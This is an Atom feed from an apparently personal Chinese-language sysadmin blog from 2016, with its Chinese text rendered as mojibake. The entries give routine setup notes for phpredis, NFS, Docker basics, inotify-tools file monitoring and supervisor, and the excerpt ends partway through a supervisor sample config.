<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Live with love]]></title>
  <subtitle><![CDATA[Live with love]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://yoursite.com/"/>
  <updated>2016-05-16T03:37:50.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name><![CDATA[è·µè¡Œ]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[php æ·»åŠ pcntlå’Œ redis æ”¯æŒ]]></title>
    <link href="http://yoursite.com/2016/05/16/php-%E6%B7%BB%E5%8A%A0pcntl%E5%92%8C-redis-%E6%94%AF%E6%8C%81/"/>
    <id>http://yoursite.com/2016/05/16/php-æ·»åŠ pcntlå’Œ-redis-æ”¯æŒ/</id>
    <published>2016-05-16T02:17:33.000Z</published>
    <updated>2016-05-16T03:37:50.000Z</updated>
    <content type="html"><![CDATA[<h3 id="pcntl"><a href="#pcntl" class="headerlink" title="pcntl"></a>pcntl</h3><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><pre><code>git clone https://github.com/phpredis/phpredis.git phpredis
cd phpredis
/usr/local/php/bin/phpize
./configure --with-php-config=/usr/local/php/bin/php-config
make &amp;&amp; make install
</code></pre><p>æœ€åè®°å¾—æŠŠæ‰©å±•åŠ å…¥ php.ini , é‡æ–°åŠ è½½é…ç½®ç”Ÿæ•ˆ</p>
<a id="more"></a>
<p>å‚è€ƒ:</p>
<p><a href="http://www.cnblogs.com/fengwei/archive/2012/09/16/2687716.html" target="_blank" rel="external">phpæ·»åŠ pcntlæ‰©å±• é—®é¢˜åŠè§£å†³æ–¹æ³•</a></p>
<p><a href="https://blog.phpgao.com/redis_php.html#å¼€å¯redisæ‰©å±•" target="_blank" rel="external">LinuxæœåŠ¡å™¨é…ç½®Rediså¹¶å¯ç”¨PHPæ”¯æŒ</a></p>
<p><a href="http://my.oschina.net/liuhuan0927/blog/616880" target="_blank" rel="external">PHP æ”¯æŒ redisæ‰©å±•</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="pcntl"><a href="#pcntl" class="headerlink" title="pcntl"></a>pcntl</h3><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><pre><code>git clone https://github.com/phpredis/phpredis.git phpredis
cd phpredis
/usr/local/php/bin/phpize
./configure --with-php-config=/usr/local/php/bin/php-config
make &amp;&amp; make install
</code></pre><p>æœ€åè®°å¾—æŠŠæ‰©å±•åŠ å…¥ php.ini , é‡æ–°åŠ è½½é…ç½®ç”Ÿæ•ˆ</p>]]>
    
    </summary>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="redis" scheme="http://yoursite.com/tags/redis/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos7 é…ç½® NFS]]></title>
    <link href="http://yoursite.com/2016/05/12/Centos7-%E9%85%8D%E7%BD%AE-NFS/"/>
    <id>http://yoursite.com/2016/05/12/Centos7-é…ç½®-NFS/</id>
    <published>2016-05-12T08:35:09.000Z</published>
    <updated>2016-05-12T08:37:26.000Z</updated>
    <content type="html"><![CDATA[<p>å‚è€ƒ:</p>
<p>é˜²ç«å¢™å¼€æ”¾ç«¯å£111å’Œ2049</p>
<p><a href="http://blog.dreamlu.net/blog/67" target="_blank" rel="external">http://blog.dreamlu.net/blog/67</a></p>
<p><a href="http://www.server-world.info/en/note?os=CentOS_7&amp;p=nfs" target="_blank" rel="external">http://www.server-world.info/en/note?os=CentOS_7&amp;p=nfs</a></p>
<p><a href="http://www.server-world.info/en/note?os=CentOS_7&amp;p=nfs&amp;f=2" target="_blank" rel="external">http://www.server-world.info/en/note?os=CentOS_7&amp;p=nfs&amp;f=2</a></p>
<p>æŒ‚è½½å‘½ä»¤</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>å‚è€ƒ:</p>
<p>é˜²ç«å¢™å¼€æ”¾ç«¯å£111å’Œ2049</p>
<p><a href="http://blog.dreamlu.net/blog/67" target="_blank" rel="external">http://blog.dreamlu.net/blog/6]]>
    </summary>
    
      <category term="nfs" scheme="http://yoursite.com/tags/nfs/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[<<Dockerä»å…¥é—¨åˆ°å®è·µ>>è¯»ä¹¦ç¬”è®°(ä¸€) åŸºç¡€ç¯‡]]></title>
    <link href="http://yoursite.com/2016/05/11/Docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2016/05/11/Dockerä»å…¥é—¨åˆ°å®è·µ-è¯»ä¹¦ç¬”è®°/</id>
    <published>2016-05-11T07:41:10.000Z</published>
    <updated>2016-05-11T07:41:10.000Z</updated>
    <content type="html"><![CDATA[<hr>
<p>ç¯å¢ƒ:</p>
<ul>
<li>Mac OS X 10.11</li>
<li>Ubuntu 14.04</li>
<li>Docker Toolså®‰è£…</li>
</ul>
<p>è®°å½•ä¸€ä¸‹ docker çš„å­¦ä¹ å†ç¨‹, ä¸‰å¤§åŸºç¡€æ¦‚å¿µå·²ç»åŸºæœ¬äº†è§£, ç„¶åä¸‹ä¸€æ­¥æœ‰ç‚¹è¿·èŒ«, è™½ç„¶è¿·èŒ«, ä½†æ˜¯ä¸èƒ½æ­¢æ­¥ä¸å‰, äºæ˜¯æˆ‘å†³å®šå…ˆç”¨æœ€ç¬¨çš„æ–¹æ³•, æŒ‰ä¹¦ä¸Šè¯´çš„åšä¸€éå§â€¦, è™½ç„¶çœ‹èµ·æ¥éƒ½æ‡‚, ä½†æ˜¯ä¸åšæ„Ÿè§‰ä¸è¸å®å•Š - -<br><a id="more"></a></p>
<h4 id="u521B_u5EFA_u955C_u50CF"><a href="#u521B_u5EFA_u955C_u50CF" class="headerlink" title="åˆ›å»ºé•œåƒ"></a>åˆ›å»ºé•œåƒ</h4><p>1 æ‹‰å–ç°æœ‰é•œåƒ, ä¿®æ”¹å commit</p>
<p>2 Dockerfileåˆ›å»º</p>
<p>3 å¯¼å…¥é•œåƒåˆ›å»º</p>
<p>OpenVZå®¹å™¨æ˜¯ä¸€ä¸ªè½»é‡è™šæ‹Ÿæœºï¼Œä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿç¯å¢ƒï¼Œå®ƒçš„ä¸»è¦ç”¨é€”æ˜¯å……å½“è™šæ‹Ÿç§æœ‰æœåŠ¡å™¨ã€‚è€ŒDockerçš„å“²å­¦æ˜¯<em>æ¯ä¸ªå®¹å™¨è¿è¡Œä¸€ä¸ªåº”ç”¨è¿›ç¨‹</em></p>
<p><a href="http://chuansong.me/n/1119422" target="_blank" rel="external">openvz vs docker</a></p>
<h4 id="u5220_u9664_u955C_u50CF"><a href="#u5220_u9664_u955C_u50CF" class="headerlink" title="åˆ é™¤é•œåƒ"></a>åˆ é™¤é•œåƒ</h4><p>*æ³¨æ„ï¼šåœ¨åˆ é™¤é•œåƒä¹‹å‰è¦å…ˆç”¨ docker rm åˆ æ‰ä¾èµ–äºè¿™ä¸ªé•œåƒçš„æ‰€æœ‰å®¹å™¨ã€‚</p>
<h4 id="u8FDB_u5165_u5BB9_u5668"><a href="#u8FDB_u5165_u5BB9_u5668" class="headerlink" title="è¿›å…¥å®¹å™¨"></a>è¿›å…¥å®¹å™¨</h4><p>attach(ä¸æ¨è)</p>
<p>docker exec æ˜¯Dockerå…§å»ºçš„å‘½ä»¤ã€‚ä¸‹é¢ç¤ºç¯„å¦‚ä½•ä½¿ç”¨è©²å‘½ä»¤</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -idt ubuntu</span><br><span class="line"><span class="number">243</span>c32535da7d142fb0e6df616a3c3ada0b8ab417937c853a9e1c251f499f550</span><br><span class="line">$ sudo docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line"><span class="number">243</span>c32535da7        ubuntu:latest       <span class="string">"/bin/bash"</span>         <span class="number">18</span> seconds ago      Up <span class="number">17</span> seconds                           nostalgic_hypatia</span><br><span class="line">$sudo docker exec -ti nostalgic_hypatia bash</span><br><span class="line">root@<span class="number">243</span>c32535da7:/<span class="preprocessor">#</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/jpetazzo/nsenter" target="_blank" rel="external">nsenter</a>  è¿™ä¸ªå®‰è£…èµ·æ¥å¾ˆè›‹ç–¼å•Š, æœ‰äº†docker exec , å°±ä¸æŠ˜è…¾ nsenter äº†, è€Œä¸”å‘½ä»¤åˆè‡­åˆé•¿</p>
<h4 id="u5BB9_u5668_u7684_u5BFC_u51FA_u5BFC_u5165"><a href="#u5BB9_u5668_u7684_u5BFC_u51FA_u5BFC_u5165" class="headerlink" title="å®¹å™¨çš„å¯¼å‡ºå¯¼å…¥"></a>å®¹å™¨çš„å¯¼å‡ºå¯¼å…¥</h4><p>å¯¼å‡º</p>
<pre><code>docker export 7691a814370e &gt; ubuntu.tar
</code></pre><p>å¯¼å…¥</p>
<pre><code>cat ubuntu.tar | docker import - test/buntu:v1.0
</code></pre><p>é€šè¿‡å¯¼å…¥å¯¼å‡ºåŠŸèƒ½, å¯ä»¥å®ç°å®¹å™¨çš„è¿ç§»</p>
<p>æ€è€ƒ: é€šè¿‡docker import å¯¼å…¥äº§ç”Ÿçš„é•œåƒå’Œé€šè¿‡ docker load æ–‡ä»¶å¯¼å…¥çš„é•œåƒæœ‰ä»€ä¹ˆåŒºåˆ«</p>
<p>Tips:</p>
<p>å¦‚ä½•æ¸…ç†åå°åœæ­¢çš„å®¹å™¨ï¼Ÿ</p>
<p>å¯ä»¥ä½¿ç”¨ docker rm $(docker ps -a -q) å‘½ä»¤</p>
<p>å¦‚ä½•é€€å‡ºä¸€ä¸ªé•œåƒçš„bashï¼Œè€Œä¸ç»ˆæ­¢å®ƒï¼Ÿ</p>
<p>æŒ‰ Ctrl-p Ctrl-qã€‚</p>
<p>é€€å‡ºå®¹å™¨æ—¶å€™è‡ªåŠ¨åˆ é™¤?</p>
<p>ä½¿ç”¨ â€“rm é€‰é¡¹ï¼Œä¾‹å¦‚ sudo docker run â€“rm -it ubuntu</p>
<h4 id="u4ED3_u5E93"><a href="#u4ED3_u5E93" class="headerlink" title="ä»“åº“"></a>ä»“åº“</h4><p>ç™»é™†</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">$ docker login</span><br><span class="line">Username: xeroth</span><br><span class="line">Password:</span><br><span class="line">Email: 123321@qq.com</span><br><span class="line"><span class="label">WARNING: </span>login credentials saved in /Users/cristaly7/.docker/config.json</span><br><span class="line">Login Succeeded</span><br></pre></td></tr></table></figure>
<p>æœç´¢é•œåƒ</p>
<pre><code>docker search centos

docker search -s 100 centos æ˜¾ç¤º100â­ï¸ä»¥ä¸Šçš„é•œåƒ
</code></pre><p>â­ï¸è‡ªåŠ¨åˆ›å»º(Automated Builds) </p>
<p>è‡ªåŠ¨åˆ›å»ºåŠŸèƒ½å¯¹äºéœ€è¦ç»å¸¸å‡çº§é•œåƒå†…ç¨‹åºæ¥è¯´ï¼Œååˆ†æ–¹ä¾¿ã€‚ æœ‰æ—¶å€™ï¼Œç”¨æˆ·åˆ›å»ºäº†é•œåƒï¼Œå®‰è£…äº†æŸä¸ªè½¯ä»¶ï¼Œå¦‚æœè½¯ä»¶å‘å¸ƒæ–°ç‰ˆæœ¬åˆ™éœ€è¦æ‰‹åŠ¨æ›´æ–°é•œåƒ<br>è€Œè‡ªåŠ¨åˆ›å»ºå…è®¸ç”¨æˆ·é€šè¿‡ Docker Hub æŒ‡å®šè·Ÿè¸ªä¸€ä¸ªç›®æ ‡ç½‘ç«™ï¼ˆç›®å‰æ”¯æŒ GitHub æˆ– BitBucketï¼‰ä¸Šçš„é¡¹ç›®ï¼Œä¸€æ—¦é¡¹ç›®å‘ç”Ÿæ–°çš„æäº¤ï¼Œåˆ™è‡ªåŠ¨æ‰§è¡Œåˆ›å»ºã€‚</p>
<p>å‚è€ƒèµ„æ–™:<br><a href="https://docs.docker.com/docker-hub/builds/" target="_blank" rel="external">https://docs.docker.com/docker-hub/builds/</a><br><a href="https://www.brianchristner.io/how-to-automate-docker-builds-end-to-end/" target="_blank" rel="external">https://www.brianchristner.io/how-to-automate-docker-builds-end-to-end/</a></p>
<h5 id="dockerpool"><a href="#dockerpool" class="headerlink" title="dockerpool"></a>dockerpool</h5><p>dockerpoolæ˜¯å›½å†…çš„ä¸€ä¸ª docker é•œåƒèµ„æºç½‘ç«™</p>
<p>ä¸‹è½½ä¸€ä¸ªé•œåƒè¯•è¯•</p>
<pre><code>docker pull dl.dockerpool.com:5000/ubuntu:12.04
</code></pre><p>æŠ¥é”™:</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">docker pull dl.dockerpool.<span class="string">com:</span><span class="number">5000</span>/<span class="string">centos:</span><span class="number">7</span></span><br><span class="line">Error response from <span class="string">daemon:</span> unable to ping registry endpoint <span class="string">https:</span><span class="comment">//dl.dockerpool.com:5000/v0/</span></span><br><span class="line">v2 ping attempt failed with <span class="string">error:</span> Get <span class="string">https:</span><span class="comment">//dl.dockerpool.com:5000/v2/: tls: oversized record received with length 28012</span></span><br><span class="line"> v1 ping attempt failed with <span class="string">error:</span> Get <span class="string">https:</span><span class="comment">//dl.dockerpool.com:5000/v1/_ping: tls: oversized record received with length 28012</span></span><br></pre></td></tr></table></figure>
<p>è§£å†³æ–¹æ³•:</p>
<p>æŸ¥çœ‹è™šæ‹Ÿæœºåå­—</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">docker-machine ls</span><br><span class="line"><span class="built_in">NAME</span>      ACTIVE   <span class="built_in">DRIVER</span>       STATE     URL                         SWARM   DOCKER   ERRORS</span><br><span class="line"><span class="keyword">default</span>   *        virtualbox   Running   tcp:<span class="comment">//192.168.99.100:2376           v1.9.1</span></span><br></pre></td></tr></table></figure>
<p>è¿›å…¥docker è™šæ‹Ÿæœº</p>
<pre><code>docker-machine ssh default
</code></pre><p>åœ¨default è™šæ‹Ÿæœºé‡Œä¿®æ”¹ <em>/var/lib/boot2docker/profile</em> æ–‡ä»¶, åœ¨<strong>EXTRA_ARGS=</strong>é‡ŒåŠ å…¥:<br><em>â€“insecure-registry dl.dockerpool.com:5000</em></p>
<p>é‡å¯ vm</p>
<pre><code>docker-machine restart default
</code></pre><p>å†æ¬¡è¿è¡Œdocker pull dl.dockerpool.com:5000/ubuntu:12.04 å°±å¯ä»¥äº†</p>
<p>ä¸‹è½½å®Œæˆå:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">REPOSITORY                      TAG                 IMAGE ID            CREATED             VIRTUAL SIZE</span><br><span class="line">xeroth/sinatra                  v2                  <span class="number">1</span>a6a1230cfe3        <span class="number">3</span> days ago          <span class="number">319.4</span> MB</span><br><span class="line">ubuntu                          <span class="number">14.04</span>               af88597ec24b        <span class="number">8</span> days ago          <span class="number">187.9</span> MB</span><br><span class="line">ubuntu                          latest              af88597ec24b        <span class="number">8</span> days ago          <span class="number">187.9</span> MB</span><br><span class="line">nginx                           latest              <span class="number">813e3731</span>b203        <span class="number">3</span> weeks ago         <span class="number">133.9</span> MB</span><br><span class="line">hello-world                     latest              <span class="number">0</span>a6ba66e537a        <span class="number">3</span> months ago        <span class="number">960</span> B</span><br><span class="line">dl.dockerpool.com:<span class="number">5000</span>/ubuntu   <span class="number">12.04</span>               <span class="number">0</span>b310e6bf058        <span class="number">14</span> months ago       <span class="number">126.7</span> MB</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹ tag</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ docker tag dl.dockerpool.com:<span class="number">5000</span>/ubuntu:<span class="number">12.04</span> ubuntu:<span class="number">12.04</span></span><br><span class="line">$ /Users/cristaly7 &gt;docker images</span><br><span class="line">REPOSITORY                      TAG                 IMAGE ID            CREATED             VIRTUAL SIZE</span><br><span class="line">xeroth/sinatra                  v2                  <span class="number">1</span>a6a1230cfe3        <span class="number">3</span> days ago          <span class="number">319.4</span> MB</span><br><span class="line">ubuntu                          <span class="number">14.04</span>               af88597ec24b        <span class="number">8</span> days ago          <span class="number">187.9</span> MB</span><br><span class="line">ubuntu                          latest              af88597ec24b        <span class="number">8</span> days ago          <span class="number">187.9</span> MB</span><br><span class="line">nginx                           latest              <span class="number">813e3731</span>b203        <span class="number">3</span> weeks ago         <span class="number">133.9</span> MB</span><br><span class="line">hello-world                     latest              <span class="number">0</span>a6ba66e537a        <span class="number">3</span> months ago        <span class="number">960</span> B</span><br><span class="line">ubuntu                          <span class="number">12.04</span>               <span class="number">0</span>b310e6bf058        <span class="number">14</span> months ago       <span class="number">126.7</span> MB</span><br><span class="line">dl.dockerpool.com:<span class="number">5000</span>/ubuntu   <span class="number">12.04</span>               <span class="number">0</span>b310e6bf058        <span class="number">14</span> months ago       <span class="number">126.7</span> MB</span><br></pre></td></tr></table></figure>
<h5 id="u2B50_uFE0Fdocker__u955C_u50CF_u52A0_u901F_u7F51_u7AD9"><a href="#u2B50_uFE0Fdocker__u955C_u50CF_u52A0_u901F_u7F51_u7AD9" class="headerlink" title="â­ï¸docker é•œåƒåŠ é€Ÿç½‘ç«™"></a>â­ï¸docker é•œåƒåŠ é€Ÿç½‘ç«™</h5><p>å‘ç°äº†è¿™ä¸ª, æ„Ÿè§‰ dockerpool ç™½å¼„äº†ğŸ˜‚</p>
<p>å›½å†…çš„æœ‰ <a href="http://dockerpool.com/article/1419997003" target="_blank" rel="external">DaoCloud</a> è¿˜æœ‰é˜¿é‡Œçš„, æˆ‘æ­¤åˆ»ç”¨çš„æ˜¯é˜¿é‡ŒTAE2.0çš„<a href="http://tae.taobao.com/mirror/index.html?#/docker/speed/stat" target="_blank" rel="external">dockeråŠ é€Ÿå™¨</a></p>
<p>ä½¿ç”¨æ–¹æ³•ä¹Ÿå¾ˆç®€å•, ç™»é™†é˜¿é‡Œ, è·å–åˆ†é…çš„é•œåƒåœ°å€, è·Ÿä¸Šé¢æŠ˜è…¾ dockerpool ä¸€æ ·è¿›å…¥ vm, ä¿®æ”¹æ–‡ä»¶<em>/var/lib/boot2docker/profile</em>, åœ¨EXTRA_ARGS=é‡ŒåŠ å…¥:<em>â€“registry-mirror=<a href="http://6tgwmnjm.mirror.aliyun.com" target="_blank" rel="external">http://6tgwmnjm.mirror.aliyun.com</a></em></p>
<p>çœŸæ˜¯é£ä¸€èˆ¬çš„æ„Ÿè§‰å•Š! å¦ˆå¦ˆå†ä¹Ÿä¸ç”¨æ‹…å¿ƒæˆ‘ docker çš„ä¸Šä¼ ä¸‹è½½äº† , è°¢è°¢ TAE</p>
<h5 id="u2B50_uFE0F_u79C1_u6709_u4ED3_u5E93"><a href="#u2B50_uFE0F_u79C1_u6709_u4ED3_u5E93" class="headerlink" title="â­ï¸ç§æœ‰ä»“åº“"></a>â­ï¸ç§æœ‰ä»“åº“</h5><p><a href="http://www.a-ho.com/2016/01/15/Dockerç§æœ‰ä»“åº“/" target="_blank" rel="external">æ­å»ºç§æœ‰ä»“åº“</a>   </p>
<h4 id="u6570_u636E_u5377"><a href="#u6570_u636E_u5377" class="headerlink" title="æ•°æ®å·"></a>æ•°æ®å·</h4><p><a href="http://www.a-ho.com/2016/01/23/Dockeræ•°æ®å·/" target="_blank" rel="external">Docker æ•°æ®å·</a></p>
<h4 id="u5BB9_u5668_u4E92_u901A"><a href="#u5BB9_u5668_u4E92_u901A" class="headerlink" title="å®¹å™¨äº’é€š"></a>å®¹å™¨äº’é€š</h4><p><a href="http://www.a-ho.com/2016/01/24/å®¹å™¨é—´é€šä¿¡/" target="_blank" rel="external">å®¹å™¨é—´é€šä¿¡</a></p>
<h4 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h4><p>[]</p>
<p><a href="http://www.cnblogs.com/programfish/p/4101884.html" target="_blank" rel="external">CMD ä¸ ENTRYPOINT çš„åŒºåˆ«</a></p>
<h4 id="To_be_continue"><a href="#To_be_continue" class="headerlink" title="To be continue .."></a>To be continue ..</h4><p>Reference:</p>
<p><a href="https://github.com/docker/toolbox/issues/83" target="_blank" rel="external">docker pull è¯ä¹¦æŠ¥é”™</a></p>
<p><a href="https://www.gitbook.com/book/philipzheng/docker_practice/details" target="_blank" rel="external">Docker â€”â€” å¾å…¥é–€åˆ°å¯¦è¸Â­</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<hr>
<p>ç¯å¢ƒ:</p>
<ul>
<li>Mac OS X 10.11</li>
<li>Ubuntu 14.04</li>
<li>Docker Toolså®‰è£…</li>
</ul>
<p>è®°å½•ä¸€ä¸‹ docker çš„å­¦ä¹ å†ç¨‹, ä¸‰å¤§åŸºç¡€æ¦‚å¿µå·²ç»åŸºæœ¬äº†è§£, ç„¶åä¸‹ä¸€æ­¥æœ‰ç‚¹è¿·èŒ«, è™½ç„¶è¿·èŒ«, ä½†æ˜¯ä¸èƒ½æ­¢æ­¥ä¸å‰, äºæ˜¯æˆ‘å†³å®šå…ˆç”¨æœ€ç¬¨çš„æ–¹æ³•, æŒ‰ä¹¦ä¸Šè¯´çš„åšä¸€éå§â€¦, è™½ç„¶çœ‹èµ·æ¥éƒ½æ‡‚, ä½†æ˜¯ä¸åšæ„Ÿè§‰ä¸è¸å®å•Š - -<br>]]>
    
    </summary>
    
      <category term="Docker" scheme="http://yoursite.com/tags/Docker/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[inotify ç›‘æ§æ–‡ä»¶å’Œç›®å½•å˜åŒ–]]></title>
    <link href="http://yoursite.com/2016/05/11/inotify-%E7%9B%91%E6%8E%A7%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%98%E5%8C%96/"/>
    <id>http://yoursite.com/2016/05/11/inotify-ç›‘æ§æ–‡ä»¶å’Œç›®å½•å˜åŒ–/</id>
    <published>2016-05-11T01:49:32.000Z</published>
    <updated>2016-05-11T07:03:07.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u672C_u6765_u6253_u7B97_u628A_u8981_u76D1_u63A7_u7684_u6587_u4EF6_u653E_mysql_2C__u901A_u8FC7_u76D1_u63A7_mysql__u5B9E_u73B0"><a href="#u672C_u6765_u6253_u7B97_u628A_u8981_u76D1_u63A7_u7684_u6587_u4EF6_u653E_mysql_2C__u901A_u8FC7_u76D1_u63A7_mysql__u5B9E_u73B0" class="headerlink" title="æœ¬æ¥æ‰“ç®—æŠŠè¦ç›‘æ§çš„æ–‡ä»¶æ”¾ mysql, é€šè¿‡ç›‘æ§ mysql å®ç°"></a>æœ¬æ¥æ‰“ç®—æŠŠè¦ç›‘æ§çš„æ–‡ä»¶æ”¾ mysql, é€šè¿‡ç›‘æ§ mysql å®ç°</h3><pre><code>å¹¿å·-kali  17:06:13
mysql èƒ½ä¸èƒ½è®¾ç½®è¿™æ ·çš„åŠŸèƒ½:  æŸ¥è¯¢æŸä¸ªè¡¨çš„æŸä¸ªå­—æ®µå°±è§¦å‘æŠ¥è­¦è„šæœ¬
åŒ—äº¬-é’å±±  17:08:22
.mysql_history 
åŒ—äº¬-é’å±±  17:08:53
é»˜è®¤ä½ è¿æ¥mysqlåæ‰§è¡Œçš„å‘½ä»¤è¿™ä¸ªæ–‡ä»¶é‡Œä¼šæœ‰è®°å½•ï¼Œä½ å¯ä»¥å‘å‘Šè­¦ï¼Œä¸è¿‡æ˜¯äº‹å
åŒ—äº¬-é’å±±  17:09:19
ä¸è¿‡è¿™ä¸ªæ˜¯åœ¨æœåŠ¡å™¨ä¸Šæ“ä½œæ—¶çš„å‘Šè­¦
åŒ—äº¬-é’å±±  17:09:33
è¿œç¨‹odbcè¿æ¥çš„è¯é‡Œé¢æ²¡æœ‰
åŒ—äº¬-é’å±±  17:10:14
binlogæ—¥å¿—é‡Œåº”è¯¥å¯ä»¥æå–å‡ºæ¥

å¹¿å·-å°ç‹-Vip  17:19:42
å»ºä¸ªè§¦å‘å™¨å¯è¡Œï¼Ÿselectçš„ä¸çŸ¥é“èƒ½å¦åˆ¤æ–­ï¼Œæ²¡ç ”ç©¶è¿‡
åŒ—äº¬-é’å±±  17:20:05
selectä¸è¡Œï¼Œdelete\updateå¯ä»¥
</code></pre><p>ä½†æ˜¯ç½‘ä¸Šæœ‰çš„è¯´æŸ¥çœ‹æ­£åœ¨å†™å…¥çš„ binlog ä¼šæœ‰ä¸è‰¯åæœâ€¦ , æ‰€ä»¥å¦å¯»ä»–æ³•, æƒ³èµ·äº†ä»¥å‰åšæ–‡ä»¶åŒæ­¥æ—¶å€™ç”¨çš„ inotify</p>
<h3 id="u5B89_u88C5_u4F7F_u7528_inotify-tools"><a href="#u5B89_u88C5_u4F7F_u7528_inotify-tools" class="headerlink" title="å®‰è£…ä½¿ç”¨ inotify-tools"></a>å®‰è£…ä½¿ç”¨ inotify-tools</h3><p>inotify æ˜¯ç”¨ C çš„, ä½œä¸ºä¸€åªèœé¸Ÿ sa, æˆ‘ç”¨ç”¨å°è£…å¥½çš„inotify-tools å°±å¤Ÿäº†~</p>
<p>å®‰è£…</p>
<pre><code>yum -y install inotify-tools
</code></pre><p>çœ‹çœ‹ç›‘æ§/root  ç›®å½•çš„æ•ˆæœ, åœ¨ä¸€ä¸ªç»ˆç«¯è¾“å…¥å¦‚ä¸‹å‘½ä»¤, å¦ä¸€ä¸ªç»ˆç«¯åšæµ‹è¯•, æ¯”å¦‚cat a.txt:</p>
<pre><code>[root@node1 ~]# inotifywait -mrq --timefmt &apos;%d/%m/%y %H:%M&apos; --format &apos;%T %w%f %e&apos; -e access,move,modify,delete,create,attrib /root
11/05/16 10:54 /root/a.txt ACCESS
</code></pre><p>åˆ©ç”¨ç®¡é“å°±èƒ½è§¦å‘å˜æ›´æ“ä½œ:</p>
<pre><code>[root@node1 ~]# inotifywait -mrq --timefmt &apos;%d/%m/%y %H:%M&apos; --format &apos;%T %w%f %e&apos; -e access,move,modify,delete,create,attrib /root | while read line; do echo &quot;sb. is doing sth.&quot; ; done
</code></pre><p><a href="https://www.centos.bz/2012/06/inotify-tools-introduction/" target="_blank" rel="external">inotify-toolsä½¿ç”¨æ–¹æ³•ä»‹ç»</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u672C_u6765_u6253_u7B97_u628A_u8981_u76D1_u63A7_u7684_u6587_u4EF6_u653E_mysql_2C__u901A_u8FC7_u76D1_u63A7_mysql__u5B9E_u73B0"><a hre]]>
    </summary>
    
      <category term="inotify" scheme="http://yoursite.com/tags/inotify/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ä½¿ç”¨ supervisor ç®¡ç†è¿›ç¨‹]]></title>
    <link href="http://yoursite.com/2016/05/11/%E4%BD%BF%E7%94%A8-supervisor-%E7%AE%A1%E7%90%86%E8%BF%9B%E7%A8%8B/"/>
    <id>http://yoursite.com/2016/05/11/ä½¿ç”¨-supervisor-ç®¡ç†è¿›ç¨‹/</id>
    <published>2016-05-11T01:08:17.000Z</published>
    <updated>2016-05-16T01:12:45.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u5B89_u88C5_uFF08Centos_uFF09_uFF1A"><a href="#u5B89_u88C5_uFF08Centos_uFF09_uFF1A" class="headerlink" title="å®‰è£…ï¼ˆCentosï¼‰ï¼š"></a>å®‰è£…ï¼ˆCentosï¼‰ï¼š</h3><pre><code>yum install python-setuptools

easy_install supervisor
</code></pre><p>æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸï¼š</p>
<pre><code>echo_supervisord_conf
</code></pre><p>ä¼šæ˜¾ç¤ºä»¥ä¸‹å†…å®¹ï¼Œå…¶å®æ˜¯ä¸€ä¸ªé…ç½®æ¨¡ç‰ˆ:</p>
<pre><code>; Sample supervisor config file.
;
; For more information on the config file, please see:
; http://supervisord.org/configuration.html
;
; Notes:
;  - Shell expansion (&quot;~&quot; or &quot;$HOME&quot;) is not supported.  Environment
;    variables can be expanded using this syntax: &quot;%(ENV_HOME)s&quot;.
;  - Comments must have a leading space: &quot;a=b ;comment&quot; not &quot;a=b;comment&quot;.

[unix_http_server]
file=/tmp/supervisor.sock   ; (the path to the socket file)
;chmod=0700                 ; socket file mode (default 0700)
;chown=nobody:nogroup       ; socket file uid:gid owner
;username=user              ; (default is no username (open server))
;password=123               ; (default is no password (open server))

;[inet_http_server]         ; inet (TCP) server disabled by default
;port=127.0.0.1:9001        ; (ip_address:port specifier, *:port for all iface)
;username=user              ; (default is no username (open server))
;password=123               ; (default is no password (open server))

[supervisord]
logfile=/tmp/supervisord.log ; (main log file;default $CWD/supervisord.log)
logfile_maxbytes=50MB        ; (max main logfile bytes b4 rotation;default 50MB)
logfile_backups=10           ; (num of main logfile rotation backups;default 10)
loglevel=info                ; (log level;default info; others: debug,warn,trace)
pidfile=/tmp/supervisord.pid ; (supervisord pidfile;default supervisord.pid)
nodaemon=false               ; (start in foreground if true;default false)
minfds=1024                  ; (min. avail startup file descriptors;default 1024)
minprocs=200                 ; (min. avail process descriptors;default 200)
;umask=022                   ; (process file creation umask;default 022)
;user=chrism                 ; (default is current user, required if root)
;identifier=supervisor       ; (supervisord identifier, default is &apos;supervisor&apos;)
;directory=/tmp              ; (default is not to cd during start)
